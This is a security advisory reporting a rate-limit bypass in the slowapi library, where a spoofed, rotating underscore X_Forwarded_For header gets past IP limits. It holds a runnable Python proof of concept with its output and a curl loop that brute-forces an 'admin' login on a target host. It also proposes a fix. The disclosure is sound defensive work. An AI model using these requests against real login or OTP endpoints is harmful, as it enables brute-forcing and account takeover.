# slowapi - Rate Limit Bypass via `X_Forwarded_For` Header Injection

**Researcher:** hkmj  
**Target:** [`laurentS/slowapi`](https://github.com/laurentS/slowapi)  
**Package:** [`slowapi`](https://pypi.org/project/slowapi/) on PyPI  
**Affected Version:** `<= 0.1.9` (current latest, unfixed as of May 2026)  
**Severity:** High  
**Status:** Reported to maintainer by adding comment here -> https://github.com/laurentS/slowapi/issues/255 awaiting response 

---

## Summary

`slowapi` is a rate limiting library for FastAPI and Starlette with **many dependent repositories**. A vulnerability in `slowapi/util.py` allows an unauthenticated attacker to completely bypass IP-based rate limits by injecting a non-standard HTTP header with a rotating fake IP address.

The root cause is a single wrong character in the source code: the function `get_ipaddr()` checks for the header `"X_FORWARDED_FOR"` using an **underscore**, while Starlette/ASGI normalizes all HTTP headers using **hyphens**. This means the intended header is never matched - but the underscore variant the code actually checks is never set by real proxies, making it freely injectable by attackers.

---

## Affected Code

**File:** `slowapi/util.py`

```python
def get_ipaddr(request: Request) -> str:
    """
    Returns the ip address for the current request (or 127.0.0.1 if none found)
     based on the X-Forwarded-For headers.
    """
    if "X_FORWARDED_FOR" in request.headers:       # ← BUG: underscore, never matches
        return request.headers["X_FORWARDED_FOR"]  # ← never reached from real proxies
    else:
        if not request.client or not request.client.host:
            return "127.0.0.1"
        return request.client.host
```

**Why this is wrong:**

Starlette stores HTTP headers using **lowercase with hyphens** (`x-forwarded-for`). The underscore variant `X_FORWARDED_FOR` is a WSGI convention - it does not exist in ASGI/Starlette header lookup.

```python
# Starlette header behavior:
"X_FORWARDED_FOR" in request.headers   # always False - underscore never matches
"x-forwarded-for" in request.headers   # True - correct way to check
```

This creates **two distinct bugs**:

---

## Bug A - Proxy Detection is Broken (Functional Bug)

When an app is deployed behind nginx, Cloudflare, or any reverse proxy, the real client IP arrives in `X-Forwarded-For` (hyphen). Because `get_ipaddr()` never reads it, the rate limiter uses the **proxy's IP** for all clients - meaning all users share one rate limit bucket.

> This was partially reported in [Issue #255](https://github.com/laurentS/slowapi/issues/255) (January 2026). The fix proposed there addresses the functional issue but not the security bypass described below.

---

## Bug B - Active Rate Limit Bypass via Header Injection (Security Bug - New)

Because `get_ipaddr()` checks `X_FORWARDED_FOR` (underscore) - a header no real proxy ever sets - an attacker can **inject this header directly** with any IP value they choose.

**uvicorn passes underscore headers through unmodified.** The attacker rotates the fake IP on every request. Each unique IP creates a new rate limit bucket. The counter never reaches the limit. The attacker gets unlimited access.

This is the **security consequence of Bug A that has not been previously reported.**

---

## Proof of Concept

### Environment

```bash
pip install slowapi fastapi httpx starlette
```

### PoC Code - `slowapi_bypass_poc.py`

```python
"""
slowapi Rate Limit Bypass - PoC
Researcher: Hemanth Kumar MJ

Demonstrates that get_ipaddr() in slowapi/util.py reads X_FORWARDED_FOR (underscore),
which allows an attacker to inject a rotating fake IP and bypass rate limits entirely.
"""

from fastapi import FastAPI
from starlette.requests import Request
from starlette.testclient import TestClient
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_ipaddr
from slowapi.errors import RateLimitExceeded

# ── App setup ────────────────────────────────────────────────────────
limiter = Limiter(key_func=get_ipaddr)
app = FastAPI()
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/login")
@limiter.limit("5/minute")
async def login(request: Request):
    return {
        "msg": "login ok",
        "rate_key_used": get_ipaddr(request)  # shows what IP the limiter sees
    }

client = TestClient(app, raise_server_exceptions=False)

# ── STEP 1: Prove the limit works normally ────────────────────────────
print("STEP 1 - Normal requests (no tricks)")
print("Limit: 5/minute. Request 6 should be blocked.")
print("-" * 50)

for i in range(7):
    r = client.post("/login", json={"password": f"attempt{i}"})
    if r.status_code == 200:
        print(f"  req {i+1}: ✅ 200 OK      rate_key={r.json()['rate_key_used']}")
    else:
        print(f"  req {i+1}: 🚫 429 BLOCKED ← limit enforced")

# ── STEP 2: Bypass with rotating underscore header ────────────────────
limiter2 = Limiter(key_func=get_ipaddr)
app2 = FastAPI()
app2.state.limiter = limiter2
app2.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app2.post("/login")
@limiter2.limit("5/minute")
async def login2(request: Request):
    return {"msg": "login ok", "rate_key_used": get_ipaddr(request)}

client2 = TestClient(app2, raise_server_exceptions=False)

print()
print("STEP 2 - Attacker rotates X_Forwarded_For (underscore) header")
print("Sending 15 requests. ALL return 200 - limit never enforced.")
print("-" * 50)

bypassed = 0
for i in range(15):
    r = client2.post(
        "/login",
        json={"password": f"brute{i}"},
        headers={"X_Forwarded_For": f"10.0.0.{i}"}  # underscore, rotated
    )
    if r.status_code == 200:
        bypassed += 1
        print(f"  req {i+1:2d}: ✅ 200 OK  rate_key={r.json()['rate_key_used']}  ← BYPASS")
    else:
        print(f"  req {i+1:2d}: 🚫 429 BLOCKED")

print()
print(f"RESULT: {bypassed}/15 requests bypassed the 5/minute rate limit")
```

---

## PoC Output

### Step 1 - Rate Limit Works Normally (Control)

```
STEP 1 - Normal requests (no tricks)
Limit: 5/minute. Request 6 should be blocked.
--------------------------------------------------
  req 1: ✅ 200 OK      rate_key=testclient
  req 2: ✅ 200 OK      rate_key=testclient
  req 3: ✅ 200 OK      rate_key=testclient
  req 4: ✅ 200 OK      rate_key=testclient
  req 5: ✅ 200 OK      rate_key=testclient
  req 6: 🚫 429 BLOCKED ← limit enforced
  req 7: 🚫 429 BLOCKED ← limit enforced
```

The rate limiter is working. Without the exploit, req 6 is blocked correctly.

### Step 2 - Full Bypass via Underscore Header Injection

```
STEP 2 - Attacker rotates X_Forwarded_For (underscore) header
Sending 15 requests. ALL return 200 - limit never enforced.
--------------------------------------------------
  req  1: ✅ 200 OK  rate_key=10.0.0.0   ← BYPASS
  req  2: ✅ 200 OK  rate_key=10.0.0.1   ← BYPASS
  req  3: ✅ 200 OK  rate_key=10.0.0.2   ← BYPASS
  req  4: ✅ 200 OK  rate_key=10.0.0.3   ← BYPASS
  req  5: ✅ 200 OK  rate_key=10.0.0.4   ← BYPASS
  req  6: ✅ 200 OK  rate_key=10.0.0.5   ← BYPASS (should be 429)
  req  7: ✅ 200 OK  rate_key=10.0.0.6   ← BYPASS (should be 429)
  req  8: ✅ 200 OK  rate_key=10.0.0.7   ← BYPASS
  req  9: ✅ 200 OK  rate_key=10.0.0.8   ← BYPASS
  req 10: ✅ 200 OK  rate_key=10.0.0.9   ← BYPASS
  req 11: ✅ 200 OK  rate_key=10.0.0.10  ← BYPASS
  req 12: ✅ 200 OK  rate_key=10.0.0.11  ← BYPASS
  req 13: ✅ 200 OK  rate_key=10.0.0.12  ← BYPASS
  req 14: ✅ 200 OK  rate_key=10.0.0.13  ← BYPASS
  req 15: ✅ 200 OK  rate_key=10.0.0.14  ← BYPASS

RESULT: 15/15 requests bypassed the 5/minute rate limit
```

### Double/2 step Verification Output

To eliminate any doubt, the same fake IP repeated (without rotating) enforces the limit correctly. Only rotation bypasses it:

```
Test A - Same fake IP (10.0.0.99) repeated:
  req 1-5: 200 OK   rate_key=10.0.0.99
  req 6:   429 BLOCKED  ← limit works on repeated IP ✓

Test B - Rotating fake IP per request:
  req 1-7: 200 OK   rate_key=10.0.0.0 ... 10.0.0.6
           → limit never reached ✓ bypass confirmed
```

**The only difference between A and B is rotating the header value. That is the vulnerability.**

---

## Why It Works - Root Cause Explained

```
Normal header from nginx/Cloudflare:
  Header sent:          X-Forwarded-For: 1.2.3.4        (hyphen)
  Starlette stores as:  x-forwarded-for: 1.2.3.4
  get_ipaddr checks:    "X_FORWARDED_FOR"                (underscore)
  Result:               no match → falls back to client.host

Attacker-sent header:
  Header sent:          X_Forwarded_For: 10.0.0.1       (underscore)
  Starlette stores as:  x_forwarded_for: 10.0.0.1       (keeps underscore)
  get_ipaddr checks:    "X_FORWARDED_FOR"
  Starlette lookup:     case-insensitive → x_forwarded_for matches ✓
  Result:               get_ipaddr returns "10.0.0.1"
  Rate limit key:       "10.0.0.1"

Next request:           X_Forwarded_For: 10.0.0.2
  Rate limit key:       "10.0.0.2" → fresh counter → never hits limit
```

---

## Real-World Attack (curl)

```bash
# Unlimited login attempts against a slowapi-protected endpoint
for i in $(seq 1 1000); do
  curl -s -X POST http://target.com/login \
    -H "X_Forwarded_For: 10.0.0.$i" \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": \"attempt$i\"}"
done
```

Every request is seen as a different IP. The rate limiter never fires.

---

## Real HTTP Verification (uvicorn)

Tested over real HTTP with uvicorn - not just TestClient - confirming uvicorn passes underscore headers through unmodified:

```
req  1: HTTP 200  seen_ip=attacker.0.0.0  header_arrived=attacker.0.0.0
req  2: HTTP 200  seen_ip=attacker.1.1.1  header_arrived=attacker.1.1.1
req  3: HTTP 200  seen_ip=attacker.2.2.2  header_arrived=attacker.2.2.2
req  4: HTTP 200  seen_ip=attacker.3.3.3  header_arrived=attacker.3.3.3
req  5: HTTP 200  seen_ip=attacker.4.4.4  header_arrived=attacker.4.4.4
req  6: HTTP 200  seen_ip=attacker.5.5.5  header_arrived=attacker.5.5.5
req  7: HTTP 200  seen_ip=attacker.6.6.6  header_arrived=attacker.6.6.6
req  8: HTTP 200  seen_ip=attacker.7.7.7  header_arrived=attacker.7.7.7
```

`header_arrived` confirms the underscore header reaches the application intact.

---

## Impact

Any FastAPI or Starlette application using `slowapi` with `get_ipaddr` as `key_func` is affected. This includes:

| Endpoint Type | Impact |
|---|---|
| `/login` | Unlimited brute force attempts |
| `/forgot-password` | Unlimited password reset requests |
| `/otp/verify` | OTP brute force - bypass 2FA |
| `/register` | Unlimited account creation |
| Any rate-limited API | Full bypass |

---


**What this report adds:**

The underscore header that `get_ipaddr` accidentally reads (`X_FORWARDED_FOR`) is never set by real proxies - but an attacker can set it deliberately. Uvicorn passes underscore headers through unmodified. The rate limiter reads the attacker-controlled value as the rate limit key. By rotating that value per request, the attacker creates a new counter bucket every time. The limit is never reached. Unlimited access.

This is not a misconfiguration. It is an active exploit that requires no privileged access.


---

## Fix

**In `slowapi/util.py`, change `get_ipaddr()` to use the correct header name:**

```python
# BEFORE (vulnerable)
def get_ipaddr(request: Request) -> str:
    if "X_FORWARDED_FOR" in request.headers:       # wrong - underscore
        return request.headers["X_FORWARDED_FOR"]

# AFTER (fixed)
def get_ipaddr(request: Request) -> str:
    forwarded_for = request.headers.get("x-forwarded-for")  # correct - hyphen
    if forwarded_for:
        return forwarded_for.split(",")[0].strip()  # take leftmost IP only
    if not request.client or not request.client.host:
        return "127.0.0.1"
    return request.client.host
```

**Additional recommendation:** Document that `get_ipaddr` should only be used when the app is deployed behind a **trusted proxy** that strips and re-sets `X-Forwarded-For`. Otherwise, use Starlette's `ProxyHeadersMiddleware` with a `trusted_hosts` configuration.

---

## Timeline

| Date | Event |
|---|---|
| May 2026 | Vulnerability discovered during source code audit |
| May 2026 | PoC developed and verified (TestClient + real HTTP/uvicorn) |
| May 2026 | Reported to maintainer via GitHub(comment) |
| Pending | Fix release |

---

## References

- [slowapi GitHub](https://github.com/laurentS/slowapi)
- [slowapi PyPI](https://pypi.org/project/slowapi/)
- [Issue #255 - get_ipaddr reads wrong header key](https://github.com/laurentS/slowapi/issues/255)
